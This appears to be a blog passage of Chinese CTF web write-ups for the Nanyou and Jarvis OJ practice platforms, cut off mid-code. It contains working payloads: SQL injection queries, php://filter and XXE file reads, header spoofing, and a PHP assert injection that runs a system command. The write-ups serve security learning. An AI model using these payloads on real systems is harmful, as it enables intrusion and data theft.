        <content type="html"><![CDATA[<p>南邮OG-CTF Web Writeup</p><p>2019年12月28号就写成这样了,一直想等刷完了再发的.但是不想等了</p><p>@表示题目环境出现问题</p><p>#表示现目前还没有做的</p><p>因为时间关系,没做的就先不做了.</p><a id="more"></a><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>右键查看源码得到flag</p><h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><p>查看源码,发现有长度限制,修改为11即可了.</p><h1 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h1><ul><li>php md5()函数漏洞</li></ul><p>这道题在bugku上有,由于之前写过.这里直接就搬过来就行了</p><pre class=" language-php"><code class="language-php"><span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span> <span class="token operator">==</span> <span class="token variable">$md52</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"nctf{*****************}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false!!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"please input a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>a=s878926199a</p><h1 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h1><p>下载图片,用notepad编辑打开,在文件内容的最后找到flag</p><h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>一开始没有任何提示,于是目录扫描无果.</p><p>打开F12看网络流量(network),发现其中有一个404.html</p><p>打开就有flag</p><h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><p>在firefox中点击更多,选择文字编码方式,unincode,得到真实的AAencode的代码</p><p>然后在控制台中解码就行了</p><h1 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h1><p>用bp抓包就能得到flag</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><pre><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>得到base64编码的index.php的页面,解码后得到flag</p><h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode#"></a>php decode#</h1><h1 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h1><p>同样的,抓包就行了</p><h1 id="Download"><a href="#Download" class="headerlink" title="Download~!@"></a>Download~!@</h1><p>题目不能做了</p><h1 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h1><p>题目提示了,0==not</p><p>所以把cookie的值改为1就行了</p><p>flag:nctf{cookie_is_different_from_session}</p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p>访问robots.txt 就可以看到源代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_HOST_M</span> <span class="token punctuation">.</span> <span class="token string">':'</span> <span class="token punctuation">.</span> <span class="token constant">SAE_MYSQL_PORT</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_USER</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_PASS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_DB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$query</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"select content from ctf2 where id='$id'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;p>no! try again&lt;/p>"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这里就只使用了一个intval()函数来对id进行取整,</p><p>?id=1024.3</p><h1 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h1><ul><li>宽字节注入,%df与/结合会变成”運”,从而失去了转义的效果,直接带入mysql中,mysql解析时会无视这个字符</li></ul><p>%df%5c</p><p>判断列数,为2</p><pre><code>?id=1%df%27order%20by%203%23</code></pre><p>判断回显位置</p><pre><code>?id=-1%df%27union%20select%201,2%23</code></pre><p>在第二个位置</p><p>查数据库</p><p>sae-chinalover</p><p>查表</p><p>因为这里对单引号过滤了,可以使用16进制绕过</p><pre><code>?id=%df&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572 %23</code></pre><p>ctf,ctf2,ctf3,ctf4,gbksqli,news</p><p>查字段,挨个试一下,发现在ctf4中有flag和id</p><p>得到具体的flag</p><pre><code>?id=%df&#39;  union select 1,flag from ctf4%23</code></pre><p>flag{this_is_sqli_flag}</p><h1 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h1><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[1-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//nctf中必须是数字,才能继续执行下面的代码</span>            <span class="token keyword">echo</span> <span class="token string">'必须输入数字才行'</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'#biubiubiu'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//判断nctf中必须要存在#biubiubiu 如果存在输出flag</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">echo</span> <span class="token string">'骚年，继续努力吧啊~'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ereg()函数与MD5函数一样,同样不能处理数组</p><p>?nctf[]=#biubiubiu,然后报错了flag也就跟着出来</p><p>第二种方法是使用ereg()函数的特性,因为该函数存在截断漏洞</p><p>%00会认为是字符终止符</p><p>?nctf=1%00%23biubiubiu</p><p>nctf{use_00_to_jieduan}</p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p><strong>extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值</strong></p><p>payload</p><p>pass=&amp;thepassword_123=</p><pre><code>nctf{bian_liang_fu_gai!}</code></pre><h1 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言@"></a>PHP是世界上最好的语言@</h1><h1 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h1><p>XFF伪造,</p><p>X-Forwarded-For:127.0.0.1</p><h1 id="Header"><a href="#Header" class="headerlink" title="Header@"></a>Header@</h1><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过#"></a>上传绕过#</h1><p>00截断</p><h1 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1#"></a>SQL注入1#</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_HOST_M</span> <span class="token punctuation">.</span> <span class="token string">':'</span> <span class="token punctuation">.</span> <span class="token constant">SAE_MYSQL_PORT</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_USER</span><span class="token punctuation">,</span><span class="token constant">SAE_MYSQL_PASS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token constant">SAE_MYSQL_DB</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select user from ctf where (user='"</span><span class="token punctuation">.</span><span class="token variable">$user</span><span class="token punctuation">.</span><span class="token string">"') and (pw='"</span><span class="token punctuation">.</span><span class="token variable">$pass</span><span class="token punctuation">.</span><span class="token string">"')"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;/br>'</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">;</span>  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;p>Logged in! flag:******************** &lt;/p>"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;p>You are not admin!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><p>strcmp()函数存在漏洞,在5.3版本之前,当该函数接受了不符合的类型,函数发生错误,return 0</p><p>pass[]=1</p><h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难#"></a>起名字真难#</h1><h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><p>观察URL是这样的index.php?user1=Y3RmdXNlcg==</p><p>将admin进行base64编码得到YWRtaW4=</p><p>然后在文本框中把ctfuser改为admin就行了</p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>查询语句##</p><pre><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></pre><p>payload,使username后面的’闭合</p><pre><code>?username=admin \&amp;password=or 1=1%23</code></pre><h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><p>打开得到JSFuck编码的代码,在console中回车,报错</p><p>在<a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a> 在得到结果为</p><p>1bc29b36f623ba82aaf6724fd3b16718.php</p><p>然后说我被骗了,提示在脑袋里,然后就抓包</p><p>tip: history of bash</p><p>这里今天又学到了新的东西,就是bash的历史文件</p><pre><code>.bash_history</code></pre><pre><code>zip -r flagbak.zip ./*</code></pre><p>访问这个目录文件,下载下来打开就拿到flag了</p><h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2#"></a>SQL注入2#</h1><h1 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2#"></a>综合题2#</h1><h1 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h1><ul><li>vim的备份文件和临时文件格式</li><li>弱类型bypass</li></ul><p><a href="https://www.cnblogs.com/zwfc/p/5466885.html" target="_blank" rel="noopener">vim产生的备份文件和临时文件</a> </p><blockquote><p>index.php~</p><p>.index.php.swp</p></blockquote><pre class=" language-mysql"><code class="language-mysql">if(!empty($token)&&!empty($emailAddress)){    if(strlen($token)!=10) die('fail');    if($token!='0') die('fail');    $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";    $r = mysql_query($sql) or die('db error');    $r = mysql_fetch_assoc($r);    $r = $r['num'];    if($r>0){        echo $flag;</code></pre><p>判断token的长度是否等于10,值是否等于0</p><p>token=0000000000</p><h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><p>?file=php://input </p><blockquote><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。  </p><p>php://input 是个可以访问请求的原始数据的只读流。    POST 请求的情况下，最好使用 php://input 来代替 <a href="https://www.php.net/manual/zh/reserved.variables.httprawpostdata.php" target="_blank" rel="noopener">$HTTP_RAW_POST_DATA</a>，因为它不依赖于特定的 php.ini 指令。    而且，这样的情况下 <a href="https://www.php.net/manual/zh/reserved.variables.httprawpostdata.php" target="_blank" rel="noopener">$HTTP_RAW_POST_DATA</a> 默认没有填充，    比激活 <a href="https://www.php.net/manual/zh/ini.core.php#ini.always-populate-raw-post-data" target="_blank" rel="noopener">always_populate_raw_post_data</a>     潜在需要更少的内存。    <em>enctype=”multipart/form-data”</em> 的时候    php://input 是无效的。   </p></blockquote><p>然后POST的数据内容为meizijiu,即可得到flag</p><h1 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><pre class=" language-php"><code class="language-php"><span class="token markup">&lt;!--foreach($_GET as $key =></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">==</span> <span class="token string">"meizijiu233"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>   </code></pre><p>?name=meizijiu233</p><h1 id="HateIT"><a href="#HateIT" class="headerlink" title="HateIT@"></a>HateIT@</h1><h1 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous@"></a>Anonymous@</h1>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 南邮OG-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ CTF Writeup</title>
      <link href="/posts/20200103/"/>
      <url>/posts/20200103/</url>
      
        <content type="html"><![CDATA[<p>Jarvis OJ CTF Writeup</p><p><strong><em>比较好的一个平台,学到了很多,非常推荐.</em></strong></p><h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><ul><li>XXE</li></ul><p>提示是请设法获得目标机器/home/ctf/flag.txt中的flag值。</p><p>可以利用里面XML注入,中的file</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY b SYSTEM  "file:///home/ctf/flag.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a> </p><a id="more"></a><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>localhost access only!!</p><ul><li>XFF伪造</li></ul><p>抓包</p><p>X-Forwarded-For:127.0.0.1</p><p>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p>在vps上使用</p><p>sudo curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><p>得到flag</p><p>PCTF{M45t3r_oF_CuRl}</p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>抓包后在response中得到hint</p><pre class=" language-mysql"><code class="language-mysql">Hint: "select * from `admin` where password='".md5($pass,true)."'",true代表输出16位二进制数字</code></pre><p>要想存在注入,就必须使md5加密后的内容中存在单引号之类的</p><p>这里将代码拆开一点,注意单双引号</p><pre class=" language-mysql"><code class="language-mysql">"  select * from `admin` where password=' " .md5($pass,true)."    '        " </code></pre><p>在网上找到了这个字符串<strong>ffifdyop</strong>,</p><p>为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符</p><p>其中这两个单引号就与前面和后面的两个单引号进行闭合,成为</p><pre class=" language-mysql"><code class="language-mysql">"select * from `admin` where password=''6''"</code></pre><p> 在mysql里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。如果只有数字,就不需要单引号闭合</p><p>参考链接 <a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p><p>PCTF{R4w_md5_is_d4ng3rous}</p><h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><ul><li>robots.txt(通过这道题,学到这一点.<strong>robots.txt也可能是做一道题的切入点</strong>)</li><li>抓包改参数0,1</li></ul><p><img src="https://i.loli.net/2020/01/03/MZ4J56YFby8Xsqk.png" alt></p><h1 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h1><ul><li>GIT源码泄露</li><li>命令执行</li><li>PHP语句的闭合</li></ul><p><img src="https://i.loli.net/2020/01/03/7feMgnP2BsXtZrk.png" alt></p><p>url/.git 无果,使用dirsearch扫一下</p><p><img src="https://i.loli.net/2020/01/03/vezRdglXGAmOsSf.png" alt></p><pre class=" language-PHP"><code class="language-PHP"><?phpif (isset($_GET['page'])) {    $page = $_GET['page'];} else {    $page = "home";}$file = "templates/" . $page . ".php";//这里将传递的page参数值拼接进入file//$file = "templates/" . '.system("cd ../../../; ls -lA;").' . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");//file_exists('"templates/" . '.system("cd ../../../; ls -lA;").' . ".php"')?></code></pre><p><img src="https://i.loli.net/2020/01/03/Gsbae6ARcjLltix.png" alt></p><pre><code>/?page=flag&#39;.system(&quot;cat templates/flag.php;&quot;).&#39;</code></pre><p>然后右键查看源码得到flag</p><h1 id="61dctf-inject"><a href="#61dctf-inject" class="headerlink" title="[61dctf]inject"></a>[61dctf]inject</h1><ul><li>Mysql中的反引号与单引号的区别</li><li>反引号注入</li></ul><p>用dirsearch扫描一下目录,发现一个index.php~</p><p>访问这个目录,页面上什么都没有,右键查看源代码</p><pre class=" language-PHP"><code class="language-PHP"><?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";//三目运算符,如果条件为真,则执行?:中间的代码,否则执行:后面的代码$table = Filter($table);//用户自定义的过滤器mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();//desc降序排列$sql = "select 'flag{xxx}' from secret_{$table}";$ret = sql_query($sql);echo $ret[0];?></code></pre><p>反引号`在mysql中是为了区分保留字符与普通字符而引入的符号</p><blockquote><p>本题利用原理: </p><p>如果desc 后接的表不存在，则返回失败</p><p>注入点为参数table</p></blockquote><p><strong>当table=test时，由于库中存在secret_test表，因此mysqli_query()函数返回成功，继续向下执行，从而输出了flag{xxx}</strong><br> <strong>当table=123时，因为库中不存在secre_123表，因此跳转hacker()函数结束程序</strong></p><p>查询数据库,注意要使用limit 1,1 来进行限制输出,ret[0];只输出第一个</p><p>查到数据库为61d300</p><pre class=" language-mysql"><code class="language-mysql">?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1 #取第二条记录</code></pre><p>表为secret_flag,secret_test</p><pre class=" language-mysql"><code class="language-mysql">?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1 //这里就要采用16进制绕过了</code></pre><p>字段flagUwillNeverKnow</p><p>得到具体的flag</p><pre class=" language-mysql"><code class="language-mysql">?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1</code></pre><p>flag{luckyGame~}</p><p><a href="https://blog.csdn.net/qq_42939527/article/details/100129254" target="_blank" rel="noopener">参考文章</a></p><p>总结:</p><p>SQLi的类型确实很多,今天又见识到了一只反引号注入!</p><h1 id="61dctf-babyxss"><a href="#61dctf-babyxss" class="headerlink" title="[61dctf]babyxss@"></a>[61dctf]babyxss@</h1><ul><li>CSP内容安全策略绕过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP学习参考文章</a></li></ul><p>使用脚本爆破验证码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> stringstring <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> <span class="token string">""</span>    text <span class="token operator">=</span> code<span class="token punctuation">.</span>join<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    code <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> code<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'111b'</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这里填写你的字符</span>        <span class="token keyword">print</span> <span class="token string">"--------------------------"</span>        <span class="token keyword">print</span> text        <span class="token keyword">print</span> code        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> code</code></pre><p>然后进行抓包分析,可以看到CSP的内容只能加载本域的脚本文件内容</p><p><img src="https://i.loli.net/2020/01/03/4pw8rmIiGvXJM6k.png" alt></p><p>这道题有点难,还是等我把XSS深度学习了再来做</p><h1 id="61dctf-register"><a href="#61dctf-register" class="headerlink" title="[61dctf]register@"></a>[61dctf]register@</h1><ul><li>二次注入 <a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">二次注入学习参考文章</a></li></ul><p>…..</p><p>我是菜狗</p><h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><ul><li>文件读取</li><li>反序列化</li><li>链构造攻击(*其实也不算)</li></ul><p>查看图片,图片名是base64编码的.读取index.php 得到readfile();&gt;说明这里应该是文件读取的功能,因为不知道有哪些文件可以读,然后有现存一个showimg.php那就读取这个文件,得到源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string">'pctf'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断$f中是否存在.. /  \\ pctf,不存在就读取想要读取的文件名,如果存在就  echo "File not found"</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"File not found!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>然后读取index.php 然后我在firefox上代码显示不全,于是想到抓包,果然</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span 